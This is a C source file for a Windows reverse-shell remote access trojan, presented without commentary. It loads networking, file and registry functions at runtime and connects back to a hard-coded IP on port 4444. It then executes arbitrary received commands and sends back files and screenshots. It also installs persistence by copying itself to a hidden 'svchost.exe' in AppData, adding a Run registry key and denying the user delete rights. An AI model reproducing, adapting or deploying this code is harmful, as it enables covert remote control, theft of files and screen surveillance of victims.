#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <direct.h>

// ws2_32 INITIAL
typedef int      (WINAPI *pWSAStartup)(WORD, LPWSADATA);
typedef int      (WINAPI *pWSACleanup)(void);
typedef SOCKET   (WINAPI *pSocket)(int, int, int);
typedef int      (WINAPI *pConnect)(SOCKET, const struct sockaddr *, int);
typedef int      (WINAPI *pRecv)(SOCKET, char *, int, int);
typedef int      (WINAPI *pSend)(SOCKET, const char *, int, int);
typedef int      (WINAPI *pClosesocket)(SOCKET);
typedef u_short  (WINAPI *pHtons)(u_short);
typedef u_long   (WINAPI *pHtonl)(u_long);

pWSAStartup    _WSAStartup;
pWSACleanup    _WSACleanup;
pSocket        _socket;
pConnect       _connect;
pRecv          _recv;
pSend          _send;
pClosesocket   _closesocket;
pHtons         _htons;
pHtonl         _htonl;

int load_ws2() {
    HMODULE h = LoadLibraryA("ws2_32.dll");
    if (!h) return 0;

    _WSAStartup  = (pWSAStartup) GetProcAddress(h, "WSAStartup");
    _WSACleanup  = (pWSACleanup) GetProcAddress(h, "WSACleanup");
    _socket      = (pSocket)     GetProcAddress(h, "socket");
    _connect     = (pConnect)    GetProcAddress(h, "connect");
    _recv        = (pRecv)       GetProcAddress(h, "recv");
    _send        = (pSend)       GetProcAddress(h, "send");
    _closesocket = (pClosesocket)GetProcAddress(h, "closesocket");
    _htons       = (pHtons)      GetProcAddress(h, "htons");
    _htonl       = (pHtonl)      GetProcAddress(h, "htonl");

    return 1;
}
// ws2_32 FINAL

// kernel32 INITIAL
typedef BOOL (WINAPI *pCopyFileA)(LPCSTR,LPCSTR,BOOL);

pCopyFileA _CopyFileA;

int load_kernel32(){
    HMODULE h = LoadLibraryA("kernel32.dll");
    if(!h) return 0;

    _CopyFileA = (pCopyFileA) GetProcAddress(h,"CopyFileA");

    if(!_CopyFileA)
        return 0;
    return 1;
}
// kernel32 FINAL

// advapi32 INITIAL
typedef LSTATUS (WINAPI *pRegSetValueExA)(HKEY,LPCSTR,DWORD,DWORD,const BYTE *, DWORD);
typedef LSTATUS (WINAPI *pRegCloseKey)(HKEY);
typedef LSTATUS (WINAPI *pRegOpenKeyA)(HKEY,LPCSTR,PHKEY);

pRegSetValueExA     _RegSetValueExA;
pRegCloseKey        _RegCloseKey;
pRegOpenKeyA        _RegOpenKeyA;

HMODULE h_advapi32;

int load_advapi32(){
    if(!(h_advapi32 = LoadLibraryA("advapi32.dll")))
        return 0;

    _RegSetValueExA    =   (pRegSetValueExA)GetProcAddress(h_advapi32, "RegSetValueExA");
    _RegCloseKey     =   (pRegCloseKey)GetProcAddress(h_advapi32,"RegCloseKey");
    _RegOpenKeyA    =   (pRegOpenKeyA)GetProcAddress(h_advapi32,"RegOpenKeyA");

    return _RegSetValueExA && _RegCloseKey && _RegOpenKeyA;
}
// advapi32 FINAL

#define _IP 0xC0A80108
#define _PORT 4444

SOCKET sock;

void persist(){
    char path[MAX_PATH];
    char dest[MAX_PATH];
    char cmd[MAX_PATH*2];

    GetModuleFileName(NULL,path,MAX_PATH);
    snprintf(dest,MAX_PATH,"%s\\svchost.exe",getenv("APPDATA"));

    if(_stricmp(path,dest)==0)
        return;

    _CopyFileA(path,dest,FALSE);

    HKEY hKey;
    if(_RegOpenKeyA(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",&hKey)== ERROR_SUCCESS){
        _RegSetValueExA(hKey,"sys",0,REG_SZ,(BYTE*)dest,strlen(dest)+1);
        _RegCloseKey(hKey);
    }

    snprintf(cmd, sizeof(cmd), "icacls \"%s\" /deny \"%%USERNAME%%\":(D)", dest);
    system(cmd);

    snprintf(cmd,sizeof(cmd),"attrib +h \"%s\"",dest);
    system(cmd);
}

void copy(char *buffer){
    char *filename = buffer+5;
    filename[strcspn(filename,"\r\n")] = 0;

    FILE *fp = fopen(filename,"rb");
    if(!fp){
        _send(sock,"ERROR\n",6,0);
        return;
    }

    char buf[4096];
    size_t n;
    while((n=fread(buf,1,sizeof(buf),fp))>0){
        _send(sock,buf,(int)n,0);
    }

    fclose(fp);
    _closesocket(sock);
}

void print_screen(){
    int w=GetSystemMetrics(SM_CXSCREEN);
    int h=GetSystemMetrics(SM_CYSCREEN);

    int nw = w/2;
    int nh = h/2;

    HDC hScreen = GetDC(NULL);
    HDC hMen = CreateCompatibleDC(hScreen);
    HBITMAP hBmp = CreateCompatibleBitmap(hScreen,w,h);
    SelectObject(hMen,hBmp);
    BitBlt(hMen,0,0,w,h,hScreen,0,0,SRCCOPY);

    BITMAPINFO bmi = {0};
    bmi.bmiHeader.biSize        = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth        = w;
    bmi.bmiHeader.biHeight      = -h;
    bmi.bmiHeader.biPlanes      = 1;
    bmi.bmiHeader.biBitCount    = 16;
    bmi.bmiHeader.biCompression = BI_RGB;

    int size = w*h*2;
    BYTE *pixels = (BYTE*)malloc(size);
    GetDIBits(hMen,hBmp,0,h,pixels,&bmi,DIB_RGB_COLORS);

    BITMAPFILEHEADER bfh = {0};
    bfh.bfType = 0x4D42;
    bfh.bfOffBits = sizeof(BITMAPFILEHEADER)+sizeof(BITMAPINFOHEADER);
    bfh.bfSize = bfh.bfOffBits+size;

    BYTE *bmp = (BYTE*)malloc(bfh.bfSize);
    memcpy(bmp,&bfh,sizeof(bfh));
    memcpy(bmp+sizeof(bfh),&bmi.bmiHeader,sizeof(BITMAPINFOHEADER));
    memcpy(bmp+bfh.bfOffBits,pixels,size);

    _send(sock,bmp,(int)bfh.bfSize,0);

    free(pixels);
    free(bmp);
    DeleteObject(hBmp);
    DeleteDC(hMen);
    ReleaseDC(NULL,hScreen);
}

void connect_to_server(){
    struct sockaddr_in addr;
    WSADATA wsa;

    _WSAStartup(MAKEWORD(2,0), &wsa);
    sock = _socket(AF_INET,SOCK_STREAM,0);
    
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = _htonl(_IP);
    addr.sin_port = _htons(_PORT);

    while(_connect(sock,(struct sockaddr *)&addr,sizeof(addr)) !=0)
        Sleep(5000);
}

void shell(){
    char buffer[1024];
    char response[8192];
    int bytes;

    while(1){
        memset(buffer,0,sizeof(buffer));

        bytes = _recv(sock,buffer,sizeof(buffer)-1,0);

        if(bytes<=0)
            return;

        if(strncmp(buffer, "exit",4)==0)
            exit(0);

        if(strncmp(buffer, "cd ",3)==0){
            buffer[strcspn(buffer,"\r\n")]=0;
            _chdir(buffer+3);
            continue;
        }

        if(strncmp(buffer,"persist",7)==0){
            persist();
            continue;
        }

        if(strncmp(buffer,"copy ",5)==0){
            copy(buffer);
            continue;
        }

        if(strncmp(buffer,"prtsc",5)==0){
            print_screen();
            _closesocket(sock);
            continue;
        }        


        memset(response,0,sizeof(response));

        FILE *fp = _popen(buffer,"r");
        if(fp){
            while (fgets(response+strlen(response),sizeof(response)-strlen(response),fp));
            fclose(fp);
        }

        _send(sock,response,(int)strlen(response),0);
    }
}

int main(){

    if (!load_ws2())
        return 1;

    if (!load_kernel32())
        return 1;

    if (!load_advapi32())
        return 1;

    while(1){
        connect_to_server();
        shell();
        _closesocket(sock);
        _WSACleanup();
    }

    return 0;
}